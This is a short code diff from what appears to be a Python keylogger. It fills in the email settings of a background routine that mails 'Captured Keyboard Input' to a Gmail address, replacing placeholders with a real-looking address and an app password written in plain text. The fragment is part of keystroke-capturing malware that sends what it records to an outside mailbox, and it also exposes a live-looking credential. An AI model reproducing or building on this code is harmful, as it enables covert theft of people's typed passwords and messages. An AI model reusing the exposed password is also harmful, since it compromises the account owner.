@@ -45,9 +45,9 @@ def function_call():
 def send_email_in_background(body):
     def send_email():
         # Email credentials
-        sender_email = "your_mail"
-        receiver_email = "your_mail"
-        password = "apppassword"
+        sender_email = "mperarasu10@gmail.com"
+        receiver_email = "mperarasu10@gmail.com"
+        password = "icorjvweqrjwgslx"
 
         # Email content
         subject = "Captured Keyboard Input"
